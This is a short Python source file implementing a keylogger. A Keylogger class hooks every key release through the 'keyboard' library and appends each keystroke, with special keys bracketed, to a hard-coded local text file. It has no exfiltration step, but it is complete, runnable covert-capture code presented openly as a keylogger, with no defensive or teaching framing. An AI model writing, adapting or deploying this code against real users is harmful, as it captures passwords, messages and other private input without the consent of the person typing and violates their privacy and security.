import keyboard
import os

LOG_FILE = "C:/Users/nikilite/Downloads/lol.txt"  # specify the full path to the log file

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.start()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        with open(self.log_file, "a", encoding="utf-8") as file:
            file.write(name)

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def stop(self):
        keyboard.unhook_all()

if __name__ == "__main__":
    keylogger = Keylogger(log_file=LOG_FILE)
